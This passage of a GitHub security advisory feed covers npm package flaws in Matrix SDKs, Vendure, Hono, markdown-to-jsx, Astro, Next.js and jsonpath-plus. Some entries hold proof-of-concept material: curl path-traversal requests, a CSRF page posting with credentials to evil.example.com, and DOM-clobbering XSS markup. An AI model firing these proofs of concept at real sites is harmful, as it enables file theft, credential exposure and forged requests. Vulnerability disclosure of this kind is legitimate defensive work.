<li><a href="https://web.archive.org/web/20201208183910/https://www.npmjs.com/advisories/356">https://web.archive.org/web/20201208183910/https://www.npmjs.com/advisories/356</a></li>
<li><a href="https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d">https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d</a></li>
<li><a href="https://github.com/advisories/GHSA-h2p3-h48h-9jj7">https://github.com/advisories/GHSA-h2p3-h48h-9jj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h2p3-h48h-9jj7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-13T01:41:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-react-sdk] Malicious homeservers can steal message keys when the matrix-react-sdk user invites another user to a room]]></title>
        <id>https://github.com/advisories/GHSA-qcvh-p9jq-wp8v</id>
        <link href="https://github.com/advisories/GHSA-qcvh-p9jq-wp8v"/>
        <updated>2024-10-15T19:56:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>matrix-react-sdk before 3.102.0 allows a malicious homeserver to potentially steal message keys for a room when a user invites another user to that room, via injection of a malicious device controlled by the homeserver. This is possible because matrix-react-sdk before 3.102.0 shared historical message keys on invite.</p>
<h3 id="patches">Patches</h3>
<p>matrix-react-sdk 3.102.0 <a href="https://github.com/matrix-org/matrix-react-sdk/pull/12618">disables sharing message keys on invite</a> by removing calls to the vulnerable functionality.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="references">References</h3>
<p>The vulnerability in matrix-react-sdk is caused by calling <code>MatrixClient.sendSharedHistoryKeys</code> in matrix-js-sdk, which is inherently vulnerable to this sort of attack. This matrix-js-sdk vulnerability is tracked as CVE-2024-47080 / <a href="https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-4jf8-g8wp-cx7c">GHSA-4jf8-g8wp-cx7c</a>. Given that this functionality is not specific to sharing message keys on <em>invite</em>, is optional, has to be explicitly called by the caller and has been independently patched in matrix-react-sdk by removing the offending calls, we believe it is proper to treat the matrix-react-sdk vulnerability as a separate one, with its own advisory and CVE.</p>
<p>The matrix-org/matrix-react-sdk repository has recently been archived and the project was moved to <a href="https://github.com/element-hq/matrix-react-sdk">element-hq/matrix-react-sdk</a>. Given that this happened <em>after</em> the first patched release, no releases of the project on <a href="https://github.com/element-hq/matrix-react-sdk">element-hq/matrix-react-sdk</a> were ever vulnerable to this vulnerability.</p>
<p>Patching pull request: <a href="https://github.com/matrix-org/matrix-react-sdk/pull/12618">https://github.com/matrix-org/matrix-react-sdk/pull/12618</a>.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please email us at security at <a href="mailto:security@matrix.org">security at matrix.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-qcvh-p9jq-wp8v">https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-qcvh-p9jq-wp8v</a></li>
<li><a href="https://github.com/matrix-org/matrix-react-sdk/pull/12618">https://github.com/matrix-org/matrix-react-sdk/pull/12618</a></li>
<li><a href="https://github.com/matrix-org/matrix-react-sdk/commit/6fc9d7641c51ca3db8225cf58b9d6e6fdd2d6556">https://github.com/matrix-org/matrix-react-sdk/commit/6fc9d7641c51ca3db8225cf58b9d6e6fdd2d6556</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47824">https://nvd.nist.gov/vuln/detail/CVE-2024-47824</a></li>
<li><a href="https://github.com/advisories/GHSA-qcvh-p9jq-wp8v">https://github.com/advisories/GHSA-qcvh-p9jq-wp8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcvh-p9jq-wp8v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-15T18:11:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-js-sdk] Matrix JavaScript SDK's key history sharing could share keys to malicious devices]]></title>
        <id>https://github.com/advisories/GHSA-4jf8-g8wp-cx7c</id>
        <link href="https://github.com/advisories/GHSA-4jf8-g8wp-cx7c"/>
        <updated>2024-10-15T18:07:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In matrix-js-sdk versions 9.11.0 through 34.7.0, the method <code>MatrixClient.sendSharedHistoryKeys</code> is vulnerable to interception by malicious homeservers.  The method implements functionality proposed in <a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3061">MSC3061</a> and can be used by clients to share historical message keys with newly invited users, granting them access to past messages in the room.</p>
<p>However, it unconditionally sends these "shared" keys to all of the invited user's devices, regardless of whether the user's cryptographic identity is verified or whether the user's devices are signed by that identity. This allows the attacker to potentially inject its own devices to receive sensitive historical keys without proper security checks.</p>
<p>Note that this only affects clients running the SDK with the legacy crypto stack. Clients using the new Rust cryptography stack (i.e. those that call <code>MatrixClient.initRustCrypto()</code> instead of <code>MatrixClient.initCrypto()</code>) are unaffected by this vulnerability, because <code>MatrixClient.sendSharedHistoryKeys()</code> raises an exception in such environments.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in matrix-js-sdk 34.8.0 by removing the vulnerable functionality.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Remove use of affected functionality from clients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3061">MSC3061</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@matrix.org">security at matrix.org</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-4jf8-g8wp-cx7c">https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-4jf8-g8wp-cx7c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47080">https://nvd.nist.gov/vuln/detail/CVE-2024-47080</a></li>
<li><a href="https://github.com/matrix-org/matrix-spec-proposals/pull/3061">https://github.com/matrix-org/matrix-spec-proposals/pull/3061</a></li>
<li><a href="https://github.com/matrix-org/matrix-js-sdk/commit/2fb1e659c81f75253c047832dc9dcc2beddfac5f">https://github.com/matrix-org/matrix-js-sdk/commit/2fb1e659c81f75253c047832dc9dcc2beddfac5f</a></li>
<li><a href="https://github.com/advisories/GHSA-4jf8-g8wp-cx7c">https://github.com/advisories/GHSA-4jf8-g8wp-cx7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4jf8-g8wp-cx7c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-15T18:07:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vendure/asset-server-plugin] Vendure asset server plugin has local file read vulnerability with AssetServerPlugin & LocalAssetStorageStrategy]]></title>
        <id>https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</id>
        <link href="https://github.com/advisories/GHSA-r9mq-3c9r-fmjq"/>
        <updated>2024-10-15T19:56:27.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<h2 id="path-traversal">Path traversal</h2>
<p>This vulnerability allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server.</p>
<p>From Rajesh Sharma who discovered the vulnerability:</p>
<p>POC: <code>curl --path-as-is http://localhost:3000/assets/../package.json</code> gives you the content of package.json present in the local directory.</p>
<p>The vulnerability stems from usage of decodedReqPath directly in path.join without performing any path normalization i.e path.normalize in node.js</p>
<p><a href="https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358">https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358</a></p>
<p>If the vendure service is behind some server like nginx, apache, etc. Path normalization is performed on the root server level but still the actual client's request path will be sent to vendure service but not the resultant normalized path. However, depending the type of root server one can try various payloads to bypass such normalization. </p>
<p>The reporter found a customer website which uses local asset plugin and using above mentioned vulnerability, and was able to find secrets like email credentials.</p>
<h2 id="dos-via-malformed-uri">DOS via malformed URI</h2>
<p>In the same code path is an additional vector for crashing the server via a malformed URI</p>
<p>Again from Rajesh:</p>
<p>There is also a potential Denial of Service (DoS) issue when incorrectly encoded URI characters are passed as part of the asset URL. When these malformed requests are processed, they can lead to system crashes or resource exhaustion, rendering the service unavailable to users.
Exploit: <code>curl  --path-as-is http://localhost:3000/assets/%80package.json</code> , here <code>%80</code> is not a valid url-encoded character hence the decodeURIComponent is called on it, the entire app crashes. </p>
<pre><code>[:server] /Users/abc/mywork/vendure/packages/asset-server-plugin/src/plugin.ts:353
[:server]         const decodedReqPath = decodeURIComponent(req.path);
[:server]                                ^
[:server] URIError: URI malformed
</code></pre>
<h3 id="patches">Patches</h3>
<p>v3.0.5, v2.3.3</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use object storage rather than the local file system, e.g. MinIO or S3</li>
<li>Define middleware which detects and blocks requests with urls containing <code>/../</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-r9mq-3c9r-fmjq">https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-r9mq-3c9r-fmjq</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5">https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/commit/e4b58af6822d38a9c92a1d8573e19288b8edaa1c">https://github.com/vendure-ecommerce/vendure/commit/e4b58af6822d38a9c92a1d8573e19288b8edaa1c</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358">https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48914">https://nvd.nist.gov/vuln/detail/CVE-2024-48914</a></li>
<li><a href="https://github.com/advisories/GHSA-r9mq-3c9r-fmjq">https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-15T18:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vendure/asset-server-plugin] Vendure asset server plugin has local file read vulnerability with AssetServerPlugin & LocalAssetStorageStrategy]]></title>
        <id>https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</id>
        <link href="https://github.com/advisories/GHSA-r9mq-3c9r-fmjq"/>
        <updated>2024-10-15T19:56:27.000Z</updated>
        <content type="html"><![CDATA[<h1 id="description">Description</h1>
<h2 id="path-traversal">Path traversal</h2>
<p>This vulnerability allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server.</p>
<p>From Rajesh Sharma who discovered the vulnerability:</p>
<p>POC: <code>curl --path-as-is http://localhost:3000/assets/../package.json</code> gives you the content of package.json present in the local directory.</p>
<p>The vulnerability stems from usage of decodedReqPath directly in path.join without performing any path normalization i.e path.normalize in node.js</p>
<p><a href="https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358">https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358</a></p>
<p>If the vendure service is behind some server like nginx, apache, etc. Path normalization is performed on the root server level but still the actual client's request path will be sent to vendure service but not the resultant normalized path. However, depending the type of root server one can try various payloads to bypass such normalization. </p>
<p>The reporter found a customer website which uses local asset plugin and using above mentioned vulnerability, and was able to find secrets like email credentials.</p>
<h2 id="dos-via-malformed-uri">DOS via malformed URI</h2>
<p>In the same code path is an additional vector for crashing the server via a malformed URI</p>
<p>Again from Rajesh:</p>
<p>There is also a potential Denial of Service (DoS) issue when incorrectly encoded URI characters are passed as part of the asset URL. When these malformed requests are processed, they can lead to system crashes or resource exhaustion, rendering the service unavailable to users.
Exploit: <code>curl  --path-as-is http://localhost:3000/assets/%80package.json</code> , here <code>%80</code> is not a valid url-encoded character hence the decodeURIComponent is called on it, the entire app crashes. </p>
<pre><code>[:server] /Users/abc/mywork/vendure/packages/asset-server-plugin/src/plugin.ts:353
[:server]         const decodedReqPath = decodeURIComponent(req.path);
[:server]                                ^
[:server] URIError: URI malformed
</code></pre>
<h3 id="patches">Patches</h3>
<p>v3.0.5, v2.3.3</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use object storage rather than the local file system, e.g. MinIO or S3</li>
<li>Define middleware which detects and blocks requests with urls containing <code>/../</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-r9mq-3c9r-fmjq">https://github.com/vendure-ecommerce/vendure/security/advisories/GHSA-r9mq-3c9r-fmjq</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5">https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/commit/e4b58af6822d38a9c92a1d8573e19288b8edaa1c">https://github.com/vendure-ecommerce/vendure/commit/e4b58af6822d38a9c92a1d8573e19288b8edaa1c</a></li>
<li><a href="https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358">https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48914">https://nvd.nist.gov/vuln/detail/CVE-2024-48914</a></li>
<li><a href="https://github.com/advisories/GHSA-r9mq-3c9r-fmjq">https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9mq-3c9r-fmjq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-15T18:00:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hono] Hano allows bypass of CSRF Middleware by a request without Content-Type header.]]></title>
        <id>https://github.com/advisories/GHSA-2234-fmw7-43wr</id>
        <link href="https://github.com/advisories/GHSA-2234-fmw7-43wr"/>
        <updated>2024-10-15T19:56:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bypass CSRF Middleware by a request without Content-Type herader.</p>
<h3 id="details">Details</h3>
<p>Although the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.</p>
<p><a href="https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89">https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-server.js">// server.js
import { Hono } from 'hono'
import { csrf }from 'hono/csrf'
const app = new Hono()
app.use(csrf())
app.get('/', (c) =&gt; {
  return c.html('Hello Hono!')
})
app.post('/', async (c) =&gt; {
  console.log("executed")
  return c.text( await c.req.text())
})
Deno.serve(app.fetch)
</code></pre>
<pre><code class="language-poc.html">&lt;!-- PoC.html --&gt;
&lt;script&gt;
async function myclick() {
    await fetch("http://evil.example.com", {
    method: "POST",
    credentials: "include",
    body:new Blob([`test`],{}),
    });
}
&lt;/script&gt;
&lt;input type="button" onclick="myclick()" value="run" /&gt;
</code></pre>
<p>Similarly, the fetch API does not add a Content-Type header for requests that do not include a Body.</p>
<pre><code class="language-PoC2.js">await fetch("http://localhost:8000", { method: "POST", credentials: "include"});
</code></pre>
<h3 id="impact">Impact</h3>
<p>Bypass csrf protection implemented with hono csrf middleware.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr">https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr</a></li>
<li><a href="https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82">https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82</a></li>
<li><a href="https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89">https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48913">https://nvd.nist.gov/vuln/detail/CVE-2024-48913</a></li>
<li><a href="https://github.com/advisories/GHSA-2234-fmw7-43wr">https://github.com/advisories/GHSA-2234-fmw7-43wr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2234-fmw7-43wr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-15T17:43:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[markdown-to-jsx] Cross site scripting in markdown-to-jsx]]></title>
        <id>https://github.com/advisories/GHSA-4wx3-54gh-9fr9</id>
        <link href="https://github.com/advisories/GHSA-4wx3-54gh-9fr9"/>
        <updated>2024-10-15T17:36:27.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package markdown-to-jsx before 7.4.0 are vulnerable to Cross-site Scripting (XSS) via the src property due to improper input sanitization. An attacker can execute arbitrary code by injecting a malicious iframe element in the markdown.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21535">https://nvd.nist.gov/vuln/detail/CVE-2024-21535</a></li>
<li><a href="https://github.com/quantizor/markdown-to-jsx/commit/8eb74da825c0d8d2e9508d73c672bcae36ba555a">https://github.com/quantizor/markdown-to-jsx/commit/8eb74da825c0d8d2e9508d73c672bcae36ba555a</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-MARKDOWNTOJSX-6258886">https://security.snyk.io/vuln/SNYK-JS-MARKDOWNTOJSX-6258886</a></li>
<li><a href="https://github.com/advisories/GHSA-4wx3-54gh-9fr9">https://github.com/advisories/GHSA-4wx3-54gh-9fr9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4wx3-54gh-9fr9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-15T06:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] DOM Clobbering Gadget found in astro's client-side router that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-m85w-3h95-hcf9</id>
        <link href="https://github.com/advisories/GHSA-m85w-3h95-hcf9"/>
        <updated>2024-10-14T22:24:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A DOM Clobbering gadget has been discoverd in Astro's client-side router. It can lead to cross-site scripting (XSS) in websites enables Astro's client-side routing and has <em>stored</em> attacker-controlled scriptless HTML elements (i.e., <code>iframe</code> tags with unsanitized <code>name</code> attributes) on the destination pages.</p>
<h3 id="details">Details</h3>
<h4 id="backgrounds">Backgrounds</h4>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<h4 id="gadgets-found-in-astro">Gadgets found in Astro</h4>
<p>We identified a DOM Clobbering gadget in Astro's client-side routing module, specifically in the <code>&lt;ViewTransitions /&gt;</code> component. When integrated, this component introduces the following vulnerable code, which is executed during page transitions (e.g., clicking an <code>&lt;a&gt;</code> link):</p>
<p><a href="https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156">https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156</a></p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.scripts</code> lookup can be shadowed by an attacker injected non-script HTML elements (e.g., <code>&lt;img name="scripts"&gt;&lt;img name="scripts"&gt;</code>) via the browser's named DOM access mechanism. This manipulation allows an attacker to replace the intended script elements with an array of attacker-controlled scriptless HTML elements. </p>
<p>The condition <code>script.dataset.astroExec === ''</code> on line 138 can be bypassed because the attacker-controlled element does not have a data-astroExec attribute. Similarly, the check on line 134 can be bypassed as the element does not require a <code>type</code> attribute.</p>
<p>Finally, the <code>innerHTML</code> of an attacker-injected non-script HTML elements, which is plain text content before, will be set to the <code>.innerHTML</code> of an script element that leads to XSS.</p>
<h3 id="poc">PoC</h3>
<p>Consider a web application using Astro as the framework with client-side routing enabled and allowing users to embed certain scriptless HTML elements (e.g., <code>form</code> or <code>iframe</code>). This can be done through a bunch of website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<p>For PoC website, please refer to: <code>https://stackblitz.com/edit/github-4xgj2d</code>. Clicking the "about" button in the menu will trigger an <code>alert(1)</code> from an attacker-injected <code>form</code> element.</p>
<pre><code>---
import Header from "../components/Header.astro";
import Footer from "../components/Footer.astro";
import { ViewTransitions } from "astro:transitions";
import "../styles/global.css";
const { pageTitle } = Astro.props;
---
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8" /&gt;
    &lt;link rel="icon" type="image/svg+xml" href="/favicon.svg" /&gt;
    &lt;meta name="viewport" content="width=device-width" /&gt;
    &lt;meta name="generator" content={Astro.generator} /&gt;
    &lt;title&gt;{pageTitle}&lt;/title&gt;
    &lt;ViewTransitions /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;!--USER INPUT--&gt;
    &lt;iframe name="scripts"&gt;alert(1)&lt;/iframe&gt;
    &lt;iframe name="scripts"&gt;alert(1)&lt;/iframe&gt;
    &lt;!--USER INPUT--&gt;
    
    &lt;Header /&gt;
    &lt;h1&gt;{pageTitle}&lt;/h1&gt;
    &lt;slot /&gt;
    &lt;Footer /&gt;
    &lt;script&gt;
      import "../scripts/menu.js";
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that built with Astro that enable the client-side routing with <code>ViewTransitions</code> and store the user-inserted scriptless HTML tags without properly sanitizing the <code>name</code> attributes on the page.</p>
<h3 id="patch">Patch</h3>
<p>We recommend replacing <code>document.scripts</code> with <code>document.getElementsByTagName('script')</code> for referring to script elements. This will mitigate the possibility of DOM Clobbering attacks leveraging the <code>name</code> attribute.</p>
<h3 id="reference">Reference</h3>
<p>Similar issues for reference:</p>
<ul>
<li>Webpack (<a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">CVE-2024-43788</a>)</li>
<li>Vite (<a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">CVE-2024-45812</a>)</li>
<li>layui (<a href="https://github.com/layui/layui/security/advisories/GHSA-j827-6rgf-9629">CVE-2024-47075</a>)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9">https://github.com/withastro/astro/security/advisories/GHSA-m85w-3h95-hcf9</a></li>
<li><a href="https://github.com/withastro/astro/commit/a4ffbfaa5cb460c12bd486fd75e36147f51d3e5e">https://github.com/withastro/astro/commit/a4ffbfaa5cb460c12bd486fd75e36147f51d3e5e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47885">https://nvd.nist.gov/vuln/detail/CVE-2024-47885</a></li>
<li><a href="https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156">https://github.com/withastro/astro/blob/7814a6cad15f06931f963580176d9b38aa7819f2/packages/astro/src/transitions/router.ts#L135-L156</a></li>
<li><a href="https://github.com/advisories/GHSA-m85w-3h95-hcf9">https://github.com/advisories/GHSA-m85w-3h95-hcf9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m85w-3h95-hcf9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-14T20:02:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Denial of Service condition in Next.js image optimization]]></title>
        <id>https://github.com/advisories/GHSA-g77x-44xx-532m</id>
        <link href="https://github.com/advisories/GHSA-g77x-44xx-532m"/>
        <updated>2024-10-14T19:45:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The image optimization feature of Next.js contained a vulnerability which allowed for a potential Denial of Service (DoS) condition which could lead to excessive CPU consumption.</p>
<p><strong>Not affected:</strong></p>
<ul>
<li>The <code>next.config.js</code> file is configured with <code>images.unoptimized</code> set to <code>true</code> or <code>images.loader</code> set to a non-default value.</li>
<li>The Next.js application is hosted on Vercel.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This issue was fully patched in Next.js <code>14.2.7</code>. We recommend that users upgrade to at least this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that the <code>next.config.js</code> file has either <code>images.unoptimized</code>, <code>images.loader</code> or <code>images.loaderFile</code> assigned.</p>
<h4 id="credits">Credits</h4>
<p>Brandon Dahler (brandondahler), AWS
Dimitrios Vlastaras</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-g77x-44xx-532m">https://github.com/vercel/next.js/security/advisories/GHSA-g77x-44xx-532m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47831">https://nvd.nist.gov/vuln/detail/CVE-2024-47831</a></li>
<li><a href="https://github.com/vercel/next.js/commit/d11cbc9ff0b1aaefabcba9afe1e562e0b1fde65a">https://github.com/vercel/next.js/commit/d11cbc9ff0b1aaefabcba9afe1e562e0b1fde65a</a></li>
<li><a href="https://github.com/advisories/GHSA-g77x-44xx-532m">https://github.com/advisories/GHSA-g77x-44xx-532m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g77x-44xx-532m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-14T19:45:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonpath-plus] JSONPath Plus Remote Code Execution (RCE) Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</id>
        <link href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr"/>
        <updated>2024-10-21T19:02:55.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package jsonpath-plus before 10.0.0 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of vm in Node.</p>
<p><strong>Note:</strong></p>
<p>The unsafe behavior is still available after applying the fix but it is not turned on by default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21534">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3">https://github.com/JSONPath-Plus/JSONPath/commit/6b2f1b4c234292c75912b790bf7e2d7339d4ccd3</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8185019</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/issues/226">https://github.com/JSONPath-Plus/JSONPath/issues/226</a></li>
<li><a href="https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72">https://github.com/JSONPath-Plus/JSONPath/commit/b70aa713553caf838a63bac923195a5bc541fd72</a></li>
<li><a href="https://github.com/advisories/GHSA-pppg-cpfq-h7wr">https://github.com/advisories/GHSA-pppg-cpfq-h7wr</a></li>
